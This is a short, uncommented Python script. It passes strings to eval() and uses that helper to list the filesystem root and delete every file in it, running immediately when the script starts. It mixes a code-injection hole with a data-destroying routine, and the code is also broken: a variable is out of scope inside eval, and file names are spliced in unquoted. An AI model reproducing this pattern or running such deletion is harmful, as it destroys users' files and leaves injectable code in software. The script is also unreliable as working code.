import os
def evaluate_input(user_input):
    return eval(user_input)

def delete_files():
    root_dir = "/"
    files = evaluate_input("os.listdir(root_dir)")
    for file in files:
        evaluate_input(f"os.remove(os.path.join(root_dir, {file}))")

def main():
    delete_files()

if __name__ == "__main__":
    main()